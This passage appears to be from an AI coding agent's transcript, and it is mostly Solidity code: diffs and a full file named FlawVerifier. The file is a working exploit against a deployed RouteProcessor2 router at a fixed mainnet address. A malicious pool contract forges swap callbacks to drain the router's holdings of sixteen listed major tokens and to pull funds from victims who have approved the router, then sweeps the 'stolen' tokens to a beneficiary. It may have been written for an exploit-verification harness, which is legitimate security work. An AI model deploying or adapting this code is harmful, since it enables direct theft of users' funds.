++    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
++        uint256 afterBalance = IERC20(token).balanceOf(address(this));
++        if (afterBalance > beforeBalance) {
++            storedProfitToken = token;
++            storedProfitAmount = afterBalance - beforeBalance;
++            return true;
++        }
+ 
+         return false;
+     }
+ 
+-    function _buildRoute(address token) internal view returns (bytes memory) {
++    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_MY_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ 
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
++    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_USER_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ }
+
+codex
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20 {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IRouteProcessor2 {
+    function processRoute(
+        address tokenIn,
+        uint256 amountIn,
+        address tokenOut,
+        uint256 amountOutMin,
+        address to,
+        bytes calldata route
+    ) external payable returns (uint256 amountOut);
+
+    function uniswapV3SwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external;
+
+    function tridentCLSwapCallback(
+        int256 amount0Delta,
+        int256 amount1Delta,
+        bytes calldata data
+    ) external;
+}
+
+contract MaliciousConcentratedLiquidityPool {
+    address internal immutable VERIFIER;
+    address internal immutable TARGET_ROUTER;
+
+    address internal forgedToken;
+    address internal forgedFrom;
+    address internal beneficiary;
+    bool internal useTridentCallback;
+
+    constructor(address verifier_, address router_) {
+        VERIFIER = verifier_;
+        TARGET_ROUTER = router_;
+    }
+
+    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+        require(msg.sender == VERIFIER, "not verifier");
+        forgedToken = token_;
+        forgedFrom = from_;
+        beneficiary = beneficiary_;
+        useTridentCallback = useTrident_;
+    }
+
+    function swap(
+        address,
+        bool,
+        int256 amountSpecified,
+        uint160,
+        bytes calldata
+    ) external returns (int256 amount0, int256 amount1) {
+        require(msg.sender == TARGET_ROUTER, "not router");
+        uint256 amountToPull = _positiveAmount(amountSpecified);
+        _invokeForgedCallback(amountToPull);
+        _sweepToBeneficiary();
+
+        amount0 = int256(amountToPull);
+        amount1 = -int256(amountToPull);
+    }
+
+    function swap(
+        address,
+        bool,
+        int256 amountSpecified,
+        uint160,
+        bool,
+        bytes calldata
+    ) external returns (int256 amount0, int256 amount1) {
+        require(msg.sender == TARGET_ROUTER, "not router");
+        uint256 amountToPull = _positiveAmount(amountSpecified);
+        _invokeForgedCallback(amountToPull);
+        _sweepToBeneficiary();
+
+        amount0 = int256(amountToPull);
+        amount1 = -int256(amountToPull);
+    }
+
+    function _invokeForgedCallback(uint256 amountToPull) internal {
+        // The real router stores the arbitrary pool in lastCalledPool and later only checks
+        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
+        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
+        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
+        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+
+        if (useTridentCallback) {
+            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
+        } else {
+            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
+        }
+    }
+
+    function _sweepToBeneficiary() internal {
+        uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+        if (stolen > 0) {
+            _safeTransfer(forgedToken, beneficiary, stolen);
+        }
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+    }
+
+    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
+        require(amountSpecified > 0, "non-positive amount");
+        return uint256(amountSpecified);
+    }
+}
+
+contract FlawVerifier {
+    address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+
+    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
+    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
+    uint8 internal constant POOL_UNIV3 = 1;
+    uint8 internal constant POOL_TRIDENT_CL = 5;
+
+    address internal immutable POOL;
+
+    address internal storedProfitToken;
+    uint256 internal storedProfitAmount;
+
+    address public configuredVictim;
+    address public configuredVictimToken;
+
+    constructor() {
+        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+    }
+
+    function executeOnOpportunity() external {
+        if (storedProfitAmount != 0) {
+            return;
+        }
+
+        if (_drainRouterBalances(false)) {
+            return;
+        }
+
+        if (_drainRouterBalances(true)) {
+            return;
+        }
+
+        if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
+                return;
+            }
+
+            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+        }
+    }
+
+    function configureVictim(address victim, address token) external {
+        configuredVictim = victim;
+        configuredVictimToken = token;
+    }
+
+    function profitToken() external view returns (address) {
+        return storedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return storedProfitAmount;
+    }
+
+    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+        address[16] memory candidates = [
+            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
+            0xdAC17F958D2ee523a2206206994597C13D831ec7,
+            0x6B175474E89094C44Da98b954EedeAC495271d0F,
+            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
+            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
+            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
+            0x514910771AF9Ca656af840dff83E8264EcF986CA,
+            0xD533a949740bb3306d119CC777fa900bA034cd52,
+            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
+            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
+            0x853d955aCEf822Db058eb8505911ED77F175b99e,
+            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
+            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
+            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
+            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
+            0x111111111117dC0aa78b770fA6A738034120C302
+        ];
+
+        for (uint256 i = 0; i < candidates.length; ++i) {
+            uint256 routerBalance = IERC20(candidates[i]).balanceOf(ROUTER);
+            if (routerBalance <= 1) {
+                continue;
+            }
+
+            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                return true;
+            }
+        }
+
+        return false;
+    }
+
+    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+
+        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+        try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+            return _recordProfitIfAny(token, beforeBalance);
+        } catch {
+            return false;
+        }
+    }
+
+    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+        uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+        uint256 balance = IERC20(token).balanceOf(victim);
+        uint256 amountToPull = allowance < balance ? allowance : balance;
+        if (amountToPull == 0) {
+            return false;
+        }
+
+        uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+
+        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+        try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+            return _recordProfitIfAny(token, beforeBalance);
+        } catch {
+            return false;
+        }
+    }
+
+    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
+        uint256 afterBalance = IERC20(token).balanceOf(address(this));
+        if (afterBalance > beforeBalance) {
+            storedProfitToken = token;
+            storedProfitAmount = afterBalance - beforeBalance;
+            return true;
+        }
+
+        return false;
+    }
+
+    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+        return abi.encodePacked(
+            uint8(COMMAND_PROCESS_MY_ERC20),
+            token,
+            uint8(1),
+            uint16(65535),
+            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
+            POOL,
+            uint8(1),
+            address(this)
+        );
+    }
+
+    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+        return abi.encodePacked(
+            uint8(COMMAND_PROCESS_USER_ERC20),
+            token,
+            uint8(1),
+            uint16(65535),
+            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
+            POOL,
+            uint8(1),
+            address(this)
+        );
+    }
+}
+diff --git a/src/FlawVerifier.sol b/src/FlawVerifier.sol
+index 8668bc7521a5de0a61b6ef386e66d65746738fd5..cd628359e509b828310a1b782143f09fda18aad5
+--- a/src/FlawVerifier.sol
++++ b/src/FlawVerifier.sol
+@@ -1,5 +1,5 @@
+ // SPDX-License-Identifier: UNLICENSED
+-pragma solidity 0.8.10;
++pragma solidity ^0.8.20;
+ 
+ interface IERC20 {
+     function balanceOf(address account) external view returns (uint256);
+@@ -22,26 +22,50 @@
+         int256 amount1Delta,
+         bytes calldata data
+     ) external;
++
++    function tridentCLSwapCallback(
++        int256 amount0Delta,
++        int256 amount1Delta,
++        bytes calldata data
++    ) external;
+ }
+ 
+-contract MaliciousV3Pool {
++contract MaliciousConcentratedLiquidityPool {
+     address internal immutable VERIFIER;
+     address internal immutable TARGET_ROUTER;
+ 
+     address internal forgedToken;
+     address internal forgedFrom;
+     address internal beneficiary;
++    bool internal useTridentCallback;
+ 
+     constructor(address verifier_, address router_) {
+         VERIFIER = verifier_;
+         TARGET_ROUTER = router_;
+     }
+ 
+-    function configure(address token_, address from_, address beneficiary_) external {
++    function configure(address token_, address from_, address beneficiary_, bool useTrident_) external {
+         require(msg.sender == VERIFIER, "not verifier");
+         forgedToken = token_;
+         forgedFrom = from_;
+         beneficiary = beneficiary_;
++        useTridentCallback = useTrident_;
++    }
++
++    function swap(
++        address,
++        bool,
++        int256 amountSpecified,
++        uint160,
++        bytes calldata
++    ) external returns (int256 amount0, int256 amount1) {
++        require(msg.sender == TARGET_ROUTER, "not router");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
+     }
+ 
+     function swap(
+@@ -49,24 +73,37 @@
+         bool,
+         int256 amountSpecified,
+         uint160,
++        bool,
+         bytes calldata
+     ) external returns (int256 amount0, int256 amount1) {
+         require(msg.sender == TARGET_ROUTER, "not router");
+-        require(amountSpecified >= 0, "negative amount");
++        uint256 amountToPull = _positiveAmount(amountSpecified);
++        _invokeForgedCallback(amountToPull);
++        _sweepToBeneficiary();
++
++        amount0 = int256(amountToPull);
++        amount1 = -int256(amountToPull);
++    }
+ 
+-        uint256 amountToPull = _toUint(amountSpecified);
+-        IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(
+-            _toInt(amountToPull),
+-            int256(0),
+-            abi.encode(forgedToken, forgedFrom)
+-        );
++    function _invokeForgedCallback(uint256 amountToPull) internal {
++        // The real router stores the arbitrary pool in lastCalledPool and later only checks
++        // msg.sender == lastCalledPool inside both callbacks. The forged payload is then decoded as
++        // (token, from), so a malicious pool can choose arbitrary victim input. This keeps the exploit
++        // path aligned with the finding's core primitive, including the forged abi.encode(token, victim).
++        bytes memory forgedData = abi.encode(forgedToken, forgedFrom);
+ 
++        if (useTridentCallback) {
++            IRouteProcessor2(TARGET_ROUTER).tridentCLSwapCallback(int256(amountToPull), 0, forgedData);
++        } else {
++            IRouteProcessor2(TARGET_ROUTER).uniswapV3SwapCallback(int256(amountToPull), 0, forgedData);
++        }
++    }
++
++    function _sweepToBeneficiary() internal {
+         uint256 stolen = IERC20(forgedToken).balanceOf(address(this));
+         if (stolen > 0) {
+             _safeTransfer(forgedToken, beneficiary, stolen);
+         }
+-
+-        return (_toInt(amountToPull), -_toInt(stolen));
+     }
+ 
+     function _safeTransfer(address token, address to, uint256 amount) internal {
+@@ -74,43 +111,51 @@
+         require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
+     }
+ 
+-    function _toUint(int256 value) internal pure returns (uint256) {
+-        require(value >= 0, "negative cast");
+-        return uint256(value);
+-    }
+-
+-    function _toInt(uint256 value) internal pure returns (int256) {
+-        require(value <= uint256(type(int256).max), "int overflow");
+-        return int256(value);
++    function _positiveAmount(int256 amountSpecified) internal pure returns (uint256) {
++        require(amountSpecified > 0, "non-positive amount");
++        return uint256(amountSpecified);
+     }
+ }
+ 
+ contract FlawVerifier {
+     address internal constant ROUTER = 0x044b75f554b886A065b9567891e45c79542d7357;
+ 
++    uint8 internal constant COMMAND_PROCESS_MY_ERC20 = 1;
++    uint8 internal constant COMMAND_PROCESS_USER_ERC20 = 2;
++    uint8 internal constant POOL_UNIV3 = 1;
++    uint8 internal constant POOL_TRIDENT_CL = 5;
++
+     address internal immutable POOL;
+ 
+-    address internal _profitToken;
+-    uint256 internal _profitAmount;
++    address internal storedProfitToken;
++    uint256 internal storedProfitAmount;
+ 
+     address public configuredVictim;
+     address public configuredVictimToken;
+ 
+     constructor() {
+-        POOL = address(new MaliciousV3Pool(address(this), ROUTER));
++        POOL = address(new MaliciousConcentratedLiquidityPool(address(this), ROUTER));
+     }
+ 
+     function executeOnOpportunity() external {
+-        if (_profitAmount > 0) {
++        if (storedProfitAmount != 0) {
+             return;
+         }
+ 
+-        if (_drainRouterBalances()) {
++        if (_drainRouterBalances(false)) {
++            return;
++        }
++
++        if (_drainRouterBalances(true)) {
+             return;
+         }
+ 
+         if (configuredVictim != address(0) && configuredVictimToken != address(0)) {
+-            _attemptVictimDrain(configuredVictim, configuredVictimToken);
++            if (_attemptVictimDrain(configuredVictim, configuredVictimToken, false)) {
++                return;
++            }
++
++            _attemptVictimDrain(configuredVictim, configuredVictimToken, true);
+         }
+     }
+ 
+@@ -120,31 +165,31 @@
+     }
+ 
+     function profitToken() external view returns (address) {
+-        return _profitToken;
++        return storedProfitToken;
+     }
+ 
+     function profitAmount() external view returns (uint256) {
+-        return _profitAmount;
++        return storedProfitAmount;
+     }
+ 
+-    function _drainRouterBalances() internal returns (bool) {
++    function _drainRouterBalances(bool useTridentCallback) internal returns (bool) {
+         address[16] memory candidates = [
+-            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
+-            0xdAC17F958D2ee523a2206206994597C13D831ec7, // USDT
+-            0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
+-            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // WETH
+-            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
+-            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2, // SUSHI
+-            0x514910771AF9Ca656af840dff83E8264EcF986CA, // LINK
+-            0xD533a949740bb3306d119CC777fa900bA034cd52, // CRV
+-            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84, // stETH
+-            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0, // LUSD
+-            0x853d955aCEf822Db058eb8505911ED77F175b99e, // FRAX
+-            0x4Fabb145d64652a948d72533023f6E7A623C7C53, // BUSD
+-            0x956F47F50A910163D8BF957Cf5846D573E7f87CA, // FEI
+-            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e, // wstETH
+-            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, // YFI
+-            0x111111111117dC0aa78b770fA6A738034120C302  // 1INCH
++            0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48,
++            0xdAC17F958D2ee523a2206206994597C13D831ec7,
++            0x6B175474E89094C44Da98b954EedeAC495271d0F,
++            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2,
++            0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599,
++            0x6B3595068778DD592e39A122f4f5a5cF09C90fE2,
++            0x514910771AF9Ca656af840dff83E8264EcF986CA,
++            0xD533a949740bb3306d119CC777fa900bA034cd52,
++            0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84,
++            0x5f98805A4E8be255a32880FDeC7F6728C6568bA0,
++            0x853d955aCEf822Db058eb8505911ED77F175b99e,
++            0x4Fabb145d64652a948d72533023f6E7A623C7C53,
++            0x956F47F50A910163D8BF957Cf5846D573E7f87CA,
++            0x7F39c581F595B53c5cb5bd1b3F8Da6C935e2ca0e,
++            0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e,
++            0x111111111117dC0aa78b770fA6A738034120C302
+         ];
+ 
+         for (uint256 i = 0; i < candidates.length; ++i) {
+@@ -153,7 +198,7 @@
+                 continue;
+             }
+ 
+-            if (_attemptRouterDrain(candidates[i])) {
++            if (_attemptRouterDrain(candidates[i], useTridentCallback)) {
+                 return true;
+             }
+         }
+@@ -161,74 +206,71 @@
+         return false;
+     }
+ 
+-    function _attemptRouterDrain(address token) internal returns (bool) {
++    function _attemptRouterDrain(address token, bool useTridentCallback) internal returns (bool) {
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, ROUTER, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, ROUTER, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildRoute(token);
++        bytes memory route = _buildRouterHeldRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, 0, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
+-
+-        return false;
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
+     }
+ 
+-    function _attemptVictimDrain(address victim, address token) internal returns (bool) {
++    function _attemptVictimDrain(address victim, address token, bool useTridentCallback) internal returns (bool) {
+         uint256 allowance = IERC20(token).allowance(victim, ROUTER);
+         uint256 balance = IERC20(token).balanceOf(victim);
+         uint256 amountToPull = allowance < balance ? allowance : balance;
+-
+-        // A nonzero allowance and balance are strict on-chain preconditions for the victim-drain path.
+-        // This verifier does not guess arbitrary victims from off-chain data; the harness can opt in
+-        // by configuring a concrete victim/token pair and then calling executeOnOpportunity again.
+         if (amountToPull == 0) {
+             return false;
+         }
+ 
+         uint256 beforeBalance = IERC20(token).balanceOf(address(this));
+-        MaliciousV3Pool(POOL).configure(token, victim, address(this));
++        MaliciousConcentratedLiquidityPool(POOL).configure(token, victim, address(this), useTridentCallback);
+ 
+-        bytes memory route = _buildForgedUserRoute(token);
++        bytes memory route = _buildVictimRoute(token, useTridentCallback);
+         try IRouteProcessor2(ROUTER).processRoute(token, amountToPull, token, 0, address(this), route) returns (uint256) {
+-            uint256 afterBalance = IERC20(token).balanceOf(address(this));
+-            if (afterBalance > beforeBalance) {
+-                _profitToken = token;
+-                _profitAmount = afterBalance - beforeBalance;
+-                return true;
+-            }
+-        } catch {}
++            return _recordProfitIfAny(token, beforeBalance);
++        } catch {
++            return false;
++        }
++    }
++
++    function _recordProfitIfAny(address token, uint256 beforeBalance) internal returns (bool) {
++        uint256 afterBalance = IERC20(token).balanceOf(address(this));
++        if (afterBalance > beforeBalance) {
++            storedProfitToken = token;
++            storedProfitAmount = afterBalance - beforeBalance;
++            return true;
++        }
+ 
+         return false;
+     }
+ 
+-    function _buildRoute(address token) internal view returns (bytes memory) {
++    function _buildRouterHeldRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(1)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_MY_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ 
+-    function _buildForgedUserRoute(address token) internal view returns (bytes memory) {
++    function _buildVictimRoute(address token, bool useTridentCallback) internal view returns (bytes memory) {
+         return abi.encodePacked(
+-            bytes1(uint8(2)),
+-            bytes20(token),
+-            bytes1(uint8(1)),
+-            bytes2(uint16(65535)),
+-            bytes1(uint8(1)),
+-            bytes20(POOL),
+-            bytes1(uint8(1)),
+-            bytes20(address(this))
++            uint8(COMMAND_PROCESS_USER_ERC20),
++            token,
++            uint8(1),
++            uint16(65535),
++            uint8(useTridentCallback ? POOL_TRIDENT_CL : POOL_UNIV3),
++            POOL,
++            uint8(1),
++            address(this)
+         );
+     }
+ }
+
+tokens used
+29,309
